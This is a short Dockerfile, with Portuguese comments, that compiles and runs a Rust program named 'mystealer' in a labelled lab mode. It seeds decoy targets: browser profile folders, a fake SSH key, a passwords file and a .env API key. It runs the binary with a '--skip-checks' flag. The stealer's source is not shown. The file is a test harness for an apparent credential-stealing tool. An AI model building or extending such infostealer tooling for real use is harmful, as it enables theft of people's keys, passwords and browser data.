# Dockerfile para compilar e testar o mystealer
FROM rust:latest

WORKDIR /app

# Deps do sistema
RUN apt-get update && apt-get install -y \
    pkg-config \
    libssl-dev \
    xclip \
    sqlite3 \
    && rm -rf /var/lib/apt/lists/*

# Copiar cÃ³digo
COPY . .

# Criar marcador de lab
RUN touch /tmp/.mystealer_lab

# Setar env de lab
ENV MYSTEALER_LAB_MODE=1

# Compilar
RUN cargo build --release

# Criar dados de teste
RUN mkdir -p /root/.config/google-chrome/Default && \
    mkdir -p /root/.mozilla/firefox/test.default && \
    mkdir -p /root/Documents /root/Desktop /root/.ssh && \
    echo "test ssh key" > /root/.ssh/id_rsa && \
    echo "password=secret123" > /root/Documents/passwords.txt && \
    echo "API_KEY=sk-test123" > /root/.env

# Criar output dir
RUN mkdir -p /app/output

CMD ["./target/release/mystealer", "--output-dir", "/app/output", "--skip-checks"]
